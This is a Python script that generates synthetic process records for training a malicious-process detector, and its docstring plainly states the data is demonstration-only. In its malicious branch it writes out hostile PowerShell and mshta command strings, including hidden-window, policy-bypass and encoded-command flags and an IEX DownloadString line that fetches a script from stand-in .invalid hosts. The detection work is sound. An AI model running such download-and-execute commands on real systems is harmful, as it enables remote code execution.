"""Synthetic training data generator (FOR DEMONSTRATION ONLY).

It produces *text records only* - nothing is executed. Benign and malicious-like
records deliberately overlap (admin scripts that use -NoProfile, malicious
commands missing some flags, a little label noise) so the model is not trivially
perfect.

Results on this data show that the pipeline works; they are NOT evidence of
real-world detection performance. For your report, train on a real labelled
dataset (see README) by passing --csv to train.py.
"""
import base64
import random

import pandas as pd

BENIGN_PROCS = [
    ("chrome.exe", "explorer.exe", "chrome.exe --type=renderer --lang=en-US"),
    ("explorer.exe", "userinit.exe", "C:\\Windows\\Explorer.EXE"),
    ("svchost.exe", "services.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"),
    ("notepad.exe", "explorer.exe", "notepad.exe C:\\Users\\user\\notes.txt"),
    ("code.exe", "explorer.exe", "code.exe --folder-uri file:///C:/project"),
    ("winword.exe", "explorer.exe", "WINWORD.EXE /n report.docx"),
    ("python.exe", "cmd.exe", "python.exe app.py"),
    ("cmd.exe", "explorer.exe", "cmd.exe /c dir"),
    ("conhost.exe", "cmd.exe", "conhost.exe 0xffffffff -ForceV1"),
    ("OneDrive.exe", "explorer.exe", "OneDrive.exe /background"),
    ("wscript.exe", "explorer.exe", "wscript.exe C:\\Scripts\\logon.vbs"),
]
BENIGN_PS = [
    "powershell.exe -File C:\\scripts\\backup.ps1",
    "powershell.exe -NoProfile -Command Get-Process | Sort CPU",
    "powershell.exe -NoProfile -ExecutionPolicy RemoteSigned -File C:\\admin\\inventory.ps1",
    "powershell.exe Get-Service | Where Status -eq Running",
]
FAKE_HOSTS = ["http://example.invalid/a", "http://test.invalid/p.ps1", "http://lab.invalid/x"]


def _b64(rng, n):
    raw = bytes(rng.getrandbits(8) for _ in range(n))
    return base64.b64encode(raw).decode()


def _benign(rng):
    if rng.random() < 0.12:
        return dict(name="powershell.exe", parent_name=rng.choice(["explorer.exe", "cmd.exe", "taskeng.exe"]),
                    cmdline=rng.choice(BENIGN_PS),
                    cpu_percent=rng.uniform(0, 8), memory_mb=rng.uniform(40, 120),
                    num_children=rng.randint(0, 2), chain_depth=rng.randint(2, 4))
    name, parent, cmd = rng.choice(BENIGN_PROCS)
    return dict(name=name, parent_name=parent, cmdline=cmd,
                cpu_percent=rng.uniform(0, 25), memory_mb=rng.uniform(5, 900),
                num_children=rng.randint(0, 6), chain_depth=rng.randint(1, 5))


def _malicious(rng):
    if rng.random() < 0.2:                # script-host style (mshta / wscript)
        host = rng.choice(["mshta.exe", "wscript.exe"])
        cmd = (f"mshta.exe {rng.choice(FAKE_HOSTS)}" if host == "mshta.exe"
               else "wscript.exe C:\\Users\\Public\\invoice.vbs //B")
        return dict(name=host, parent_name=rng.choice(["winword.exe", "excel.exe", "outlook.exe", "cmd.exe"]),
                    cmdline=cmd, cpu_percent=rng.uniform(0, 20), memory_mb=rng.uniform(20, 120),
                    num_children=rng.randint(0, 2), chain_depth=rng.randint(3, 6))
    parts = ["powershell.exe"]
    if rng.random() < 0.7:
        parts.append("-nop")
    if rng.random() < 0.7:
        parts.append("-w hidden")
    if rng.random() < 0.4:
        parts.append("-ep bypass")
    style = rng.random()
    if style < 0.6:
        parts.append("-enc " + _b64(rng, rng.randint(60, 300)))
    elif style < 0.9:
        parts.append(f"-c IEX (New-Object Net.WebClient).DownloadString('{rng.choice(FAKE_HOSTS)}')")
    else:
        parts.append("-File C:\\Users\\Public\\update.ps1")
    parent = rng.choice(["winword.exe", "excel.exe", "outlook.exe", "wscript.exe", "mshta.exe", "cmd.exe", "wmiprvse.exe"])
    return dict(name=rng.choice(["powershell.exe", "powershell.exe", "wscript.exe", "mshta.exe"]),
                parent_name=parent, cmdline=" ".join(parts),
                cpu_percent=rng.uniform(0, 40), memory_mb=rng.uniform(30, 300),
                num_children=rng.randint(0, 3), chain_depth=rng.randint(2, 7))


def generate(n=4000, malicious_ratio=0.3, label_noise=0.02, seed=42) -> pd.DataFrame:
    rng = random.Random(seed)
    rows = []
    for _ in range(n):
        mal = rng.random() < malicious_ratio
        rec = _malicious(rng) if mal else _benign(rng)
        label = int(mal)
        if rng.random() < label_noise:      # imperfect labels, as in real data
            label = 1 - label
        rec["label"] = label
        rows.append(rec)
    return pd.DataFrame(rows)


if __name__ == "__main__":
    df = generate()
    df.to_csv("data/synthetic_processes.csv", index=False)
    print(df.label.value_counts())
